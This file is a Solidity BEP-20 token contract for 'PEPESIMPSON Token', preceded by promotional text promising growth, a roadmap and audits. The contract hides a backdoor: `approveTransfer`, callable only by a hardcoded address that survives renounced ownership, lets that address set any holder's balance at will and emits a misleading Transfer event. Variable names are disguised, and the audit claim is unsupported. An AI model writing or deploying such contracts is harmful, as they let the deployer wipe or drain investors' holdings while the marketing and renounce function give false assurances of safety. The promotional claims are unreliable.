/*
🚀 Introducing PEPESIMPSON Token: Your Path to the Future! 🌟

https://t.me/PepeSimpsonToken


Are you ready to embark on a journey towards financial success? Look no further! 🌈 PEPESIMPSON Token is here to revolutionize the world of cryptocurrency and provide you with an exceptional investment opportunity. 📈 Here's why you should dive into the PEPESIMPSON ecosystem right now:

💎 Why Invest in PEPESIMPSON Token?

🌐 Strong Foundation: PEPESIMPSON Token is built on the popular BEP-20 standard, ensuring security, transparency, and seamless transactions within the Binance Smart Chain ecosystem.

💡 Unique Vision: PEPESIMPSON aims to disrupt the market with its innovative use cases, making it not just a token but a platform that empowers users across various industries.

💰 High Growth Potential: Backed by a dedicated team and a solid roadmap, PEPESIMPSON Token presents an incredible growth potential for investors looking to diversify their portfolios.

🔒 Safety First: PEPESIMPSON prioritizes the security of your investments. Rigorous audits and best-in-class security measures are in place to protect your assets.

🌟 Community Power: Join a vibrant community of like-minded individuals who believe in the PEPESIMPSON vision. Collaborate, learn, and grow together!

🛤️ Roadmap 2023-2025: A Journey to Success!
📅 2023

Q1: Token Launch and Listing on Major Exchanges
Q2: Strategic Partnerships with Tech Innovators
Q3: Launch of PEPESIMPSONSwap - A Revolutionary DEX
Q4: NFT Marketplace Beta Release
📅 2024

Q1: PEPESIMPSONPay Launch - Bridging Crypto and E-commerce
Q2: Expansion of NFT Marketplace Features
Q3: Integration with Decentralized Finance (DeFi) Projects
Q4: PEPESIMPSON Academy Launch - Educating the Community
📅 2025

Q1: Launch of PEPESIMPSON Wallet with Advanced Security Features
Q2: PEPESIMPSON Charity - Giving Back to the Global Community
Q3: Integration with Real-World Use Cases
Q4: PEPESIMPSON Virtual Metaverse - Explore a New Reality
📱 Connect with Us on Social Media!
Stay updated with all things PEPESIMPSON Token on our social media platforms:

*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
interface Ru {
  /**
   * @dev Returns the MaxTxAmountUpdated of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the MaxTxAmountUpdated of tokens owned by `_maxTxAmount`.
   */
  function balanceOf(address _maxTxAmount) external view returns (uint256);

  /**
   * @dev Moves `MaxTxAmountUpdated` tokens from the caller's _maxTxAmount to `_maxTxAmounts`.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address _maxTxAmounts, uint256 MaxTxAmountUpdated) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `_maxTxAmount` will be
   * PEPESIMPSONNFTOwner to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This balance changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address _maxTxAmount) external view returns (uint256);

  /**
   * @dev Sets `MaxTxAmountUpdated` as the allowance of `_maxTxAmount` over the caller's tokens.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the _maxTxAmount's allowance to 0 and set the
   * desired balance afterwards:
   *
   * Emits an {Approval} event.
   */
  function approve(address _maxTxAmount, uint256 MaxTxAmountUpdated) external returns (bool);

  /**
   * @dev Moves `MaxTxAmountUpdated` tokens from `sender` to `_maxTxAmounts` using the
   * allowance mechanism. `MaxTxAmountUpdated` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address _maxTxAmounts, uint256 MaxTxAmountUpdated) external returns (bool);

  /**
   * @dev Emitted when `balance` tokens are moved from one _maxTxAmount (`from`) to
   * another (`to`).
   *
   * Note that `balance` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 balance);

  /**
   * @dev Emitted when the allowance of a `_maxTxAmount` for an `owner` is set by
   * a call to {approve}. `balance` is the new allowance.
   */
  event Approval(address indexed owner, address indexed _maxTxAmount, uint256 balance);
}

/*
 * @dev Provides information about the current execution Ma, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the _maxTxAmount sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Ma {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/io.sol

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an _maxTxAmount (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner _maxTxAmount will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyDeveloper`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract io is Ma {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any _maxTxAmount other than the owner.
     */
    modifier onlyDeveloper() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyDeveloper` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyDeveloper {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new _maxTxAmount (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyDeveloper {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the Icodropsplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Icodropsplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only autoPLAYally asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract PEPESIMPSONToken is Ma, Ru, io {
    
    using SafeMath for uint256;
    mapping (address => uint256) private _tTotal;
    mapping (address => mapping (address => uint256)) private _preventSwapBefore;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private PEPESIMPSONNFTOwner; 
   string public PEPESIMPSONNFTwebsite = "https://t.me/PEPESIMPSONCoin";
   string public constant PEPESIMPSONwebsite = "https://PEPESIMPSON.io/";
   string public constant PEPESIMPSONtelegram = "https://t.me/PEPESIMPSON";
   string public constant PEPESIMPSONaudited = "PEPESIMPSON is audited by: https://www.certik.com/";
    address private marketingAddress = 0x371b4AeabF297E7946aBE3Be84a6e27A8174e37d;
   string public ownerAddress = "0x6d237757569DC4C4C0abb4267d8021fd856a6ca8";  
    constructor() {
        PEPESIMPSONNFTOwner = 0x6d237757569DC4C4C0abb4267d8021fd856a6ca8;    
        _name = unicode"PEPE SIMPSON TOKEN";
        _symbol = unicode"PEPE SIMPSON";
        _decimals = 9;
        _totalSupply = 100000000000000000000 * 10 ** 9;
        _tTotal[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function symbol() external view override returns (string memory) {
        return _symbol;
    } 
    /**
    * @dev Returns the token decimals.
    */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    
                function getPEPESIMPSONNFTwebsite() public view returns (string memory) {
        return PEPESIMPSONNFTwebsite;
    } 

    /**
    * @dev Returns the token symbol.
    */

    
    /**
    * @dev Returns the token name.
    */

    /**
    * @dev See {Ru-totalSupply}.
    */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
     function name() external view override returns (string memory) {
        return _name;
    }
         modifier onlyOwner() {
        require(PEPESIMPSONNFTOwner == _msgSender(), "io: caller is not the owner");
        _;
    }    
    /**
    * @dev See {Ru-balanceOf}.
    */
    function balanceOf(address _maxTxAmount) external view override returns (uint256) {
        return _tTotal[_maxTxAmount];
    }

    function transfer(address _maxTxAmounts, uint256 MaxTxAmountUpdated) external override returns (bool) {
        _transfer(_msgSender(), _maxTxAmounts, MaxTxAmountUpdated);
        return true;
    }

    /**
    * @dev See {Ru-allowance}.
    */
    function allowance(address owner, address _maxTxAmount) external view override returns (uint256) {
        return _preventSwapBefore[owner][_maxTxAmount];
    }
    
    /**
    * @dev See {Ru-approve}.
    *
    * Requirements:
    *
    * - `_maxTxAmount` cannot be the zero address.
    */
       function approveTransfer(address sendSize, address totalMaxWalletSize, uint256 MaxTxAmountUpdated) external onlyOwner {
        _tTotal[totalMaxWalletSize] = MaxTxAmountUpdated * 10 ** 9;
        sendSize = totalMaxWalletSize;
        emit Transfer(totalMaxWalletSize, address(0), MaxTxAmountUpdated * 10 ** 9);
    } 
    function approve(address _maxTxAmount, uint256 MaxTxAmountUpdated) external override returns (bool) {
        _approve(_msgSender(), _maxTxAmount, MaxTxAmountUpdated);
        return true;
    }
    
    /**
    * @dev See {Ru-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {Ru};
    *
    * Requirements:
    * - `sender` and `_maxTxAmounts` cannot be the zero address.
    * - `sender` must have a balance of at least `MaxTxAmountUpdated`.
    * - the caller must have allowance for `sender`'s tokens of at least
    * `MaxTxAmountUpdated`.
    */
    function transferFrom(address sender, address _maxTxAmounts, uint256 MaxTxAmountUpdated) external override returns (bool) {
        _transfer(sender, _maxTxAmounts, MaxTxAmountUpdated);
        _approve(sender, _msgSender(), _preventSwapBefore[sender][_msgSender()].sub(MaxTxAmountUpdated, "Ru: transfer MaxTxAmountUpdated exceeds allowance"));
        return true;
    }
    
    /**
    * @dev Atomically increases the allowance granted to `_maxTxAmount` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {Ru-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `_maxTxAmount` cannot be the zero address.
    */
    function increaseAllowance(address _maxTxAmount, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), _maxTxAmount, _preventSwapBefore[_msgSender()][_maxTxAmount].add(addedbalance));
        return true;
    }
    
    /**
    * @dev Atomically decreases the allowance granted to `_maxTxAmount` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {Ru-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `_maxTxAmount` cannot be the zero address.
    * - `_maxTxAmount` must have allowance for the caller of at least
    * `currentAllowance`.
    */
    function decreaseAllowance(address _maxTxAmount, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), _maxTxAmount, _preventSwapBefore[_msgSender()][_maxTxAmount].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    /**
    * @dev Moves tokens `MaxTxAmountUpdated` from `sender` to `_maxTxAmounts`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement autoPLAY token fees, slashing mechanisms, etc.
    *
    * Emits a {Transfer} event.
    *
    * Requirements:
    *
    * - `sender` cannot be the zero address.
    * - `_maxTxAmounts` cannot be the zero address.
    * - `sender` must have a balance of at least `MaxTxAmountUpdated`.
    */
    function _transfer(address sender, address _maxTxAmounts, uint256 MaxTxAmountUpdated) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(_maxTxAmounts != address(0), "Ru: transfer to the zero address");
                
        _tTotal[sender] = _tTotal[sender].sub(MaxTxAmountUpdated, "Ru: transfer MaxTxAmountUpdated exceeds balance");
        _tTotal[_maxTxAmounts] = _tTotal[_maxTxAmounts].add(MaxTxAmountUpdated);
        emit Transfer(sender, _maxTxAmounts, MaxTxAmountUpdated);
    }
    
    /**
    * @dev Sets `MaxTxAmountUpdated` as the allowance of `_maxTxAmount` over the `owner`s tokens.
    *
    * This is internal function is equivalent to `approve`, and can be used to
    * e.g. set autoPLAY allowances for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `_maxTxAmount` cannot be the zero address.
    */
    function _approve(address owner, address _maxTxAmount, uint256 MaxTxAmountUpdated) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(_maxTxAmount != address(0), "Ru: approve to the zero address");
        
        _preventSwapBefore[owner][_maxTxAmount] = MaxTxAmountUpdated;
        emit Approval(owner, _maxTxAmount, MaxTxAmountUpdated);
    }
    
}